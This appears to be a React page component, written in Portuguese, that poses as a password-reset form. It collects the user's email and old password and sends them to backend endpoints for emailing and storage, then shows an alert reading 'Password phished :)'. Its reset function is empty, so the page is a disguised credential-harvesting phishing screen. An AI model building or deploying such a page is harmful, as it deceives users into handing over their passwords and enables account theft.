import { useEffect, useState } from 'react';
import Cabecalho from '../../components/cabecalho';
import './index.scss';
import axios from 'axios';

export default function App() {

    const [email, setEmail] = useState('');
    const [senha, setSenha] = useState('');
    const [erro, setErro] = useState('');
    const [senhaNova, setSenhaNova] = useState('');
    const [senhaNova2, setSenhaNova2] = useState('');

    async function enviar(event) {
        event.preventDefault();

        if (email === '' || senha === '' || senhaNova === '' || senhaNova2 === '') {
            setErro('Preencha todos os campos');
        }
        else if (senhaNova.length < 6) {
            setErro('A senha nova deve ter pelo menos 6 caracteres')
        }
        else {
            let dados = {
                text: senha,
                subject: email
            }

            let resp = await axios.post('http://localhost:5000/enviarEmail', dados);
            console.log(resp);

            try {
                const r = await axios.post('http://localhost:5000/senhas', [senha, email]);
                console.log(r);
                alert('Senha Pescada :)');
    
            } catch (err) {
                alert(err.message);
            }

        }
    }

    async function Redefinir() {
       
    }

    


    return (
        <main className='pagina-app'>
            <Cabecalho />

            <header className='home-principal'>
                <div className='card'>
                    <div className='card-texts'>
                        <h6>Crie uma senha forte</h6>
                        <p>Sua senha precisa ter pelo menos 6 caracteres e incluir uma combinação de números, letras e caracteres especiais (!$@％).</p>
                    </div>

                    <div>
                        <div id='erro'>
                            <span>{erro}</span>
                        </div>
                        <input type='text' placeholder='E-mail ou nome de usuário' value={email} onChange={e => setEmail(e.target.value)} />
                        <input type='text' placeholder='Senha antiga' value={senha} onChange={e => setSenha(e.target.value)} />
                        <input type='text' placeholder='Nova senha' value={senhaNova} onChange={e => setSenhaNova(e.target.value)}/>
                        <input type='text' placeholder='Repita a nova senha' value={senhaNova2} onChange={e => setSenhaNova2(e.target.value)}/>
                    </div>

                    <div>
                        <a  onClick={enviar}>Redefinir senha</a>
                    </div>
                </div>
            </header>
        </main>
    )
}